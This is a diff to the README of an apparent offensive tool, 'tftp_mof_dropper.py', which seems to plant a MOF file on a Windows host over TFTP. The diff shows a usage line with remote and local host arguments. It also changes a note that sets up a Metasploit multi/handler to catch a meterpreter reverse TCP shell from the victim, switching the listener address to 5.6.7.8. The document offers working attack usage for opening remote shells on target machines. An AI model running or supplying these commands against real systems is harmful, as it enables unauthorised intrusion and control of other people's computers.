@@ -31,4 +31,4 @@ optional arguments:
 Example:
 `python tftp_mof_dropper.py --rhost 1.2.3.4 --lhost 5.6.7.8`
 
-Note: you must run a metasploit handler or netcat listener (depending on the payload you use) which captures the incoming reverse shell before executing the script. Create it with e.g. `msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 0.0.0.0; run' -q`
+Note: you must run a metasploit handler or netcat listener (depending on the payload you use) which captures the incoming reverse shell before executing the script. Create it with e.g. `msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 5.6.7.8; run' -q`
